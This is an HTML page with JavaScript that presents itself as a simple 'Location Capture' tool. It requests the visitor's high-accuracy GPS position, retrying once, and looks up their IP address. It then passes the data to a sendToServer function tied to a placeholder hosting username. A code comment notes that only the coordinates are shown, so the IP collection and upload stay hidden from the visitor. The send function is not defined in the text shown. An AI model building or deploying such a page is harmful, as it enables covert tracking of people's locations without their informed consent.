<!DOCTYPE html>
<html>
<head>
    <title>Location Capture</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            background:#f0f2f5;
        }
        .card {
            background:white;
            padding:30px;
            border-radius:10px;
            text-align:center;
            width:90%;
            max-width:400px;
        }
        button {
            padding:10px 20px;
            font-size:16px;
            margin-top:10px;
            cursor:pointer;
        }
    </style>
</head>
<body>

<div class="card">
    <h3>Location Capture</h3>
    <p>Click to get your current coordinates</p>

    <button onclick="start()">Allow & Continue</button>

    <p id="status"></p>
    <div id="result" style="margin-top:15px;"></div>
</div>

<script>

const PA_USER = "REPLACE_WITH_USERNAME";
let sent = false;

function start() {
    document.getElementById("status").innerText = "Getting GPS...";

    let data = {
        ip: "0.0.0.0",
        lat: "0",
        lon: "0",
        type: "UNKNOWN"
    };

    // fallback IP (optional)
    fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(json => {
        data.ip = json.ip;
    })
    .catch(() => {});

    // GPS
    if (navigator.geolocation) {

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                data.lat = pos.coords.latitude;
                data.lon = pos.coords.longitude;
                data.type = "GPS";
                processData(data);
            },
            (err) => {
                // retry once
                navigator.geolocation.getCurrentPosition(
                    (pos2) => {
                        data.lat = pos2.coords.latitude;
                        data.lon = pos2.coords.longitude;
                        data.type = "GPS-RETRY";
                        processData(data);
                    },
                    () => {
                        processData(data);
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            },
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );

    } else {
        processData(data);
    }

    // safety fallback
    setTimeout(() => {
        processData(data);
    }, 9000);
}

function processData(data) {

    if (sent) return;
    sent = true;

    // 🔥 ONLY COORDINATES SHOWN
    document.getElementById("result").innerHTML =
        "📍 Latitude: " + data.lat +
        "<br>📍 Longitude: " + data.lon;

    sendToServer(data);
}
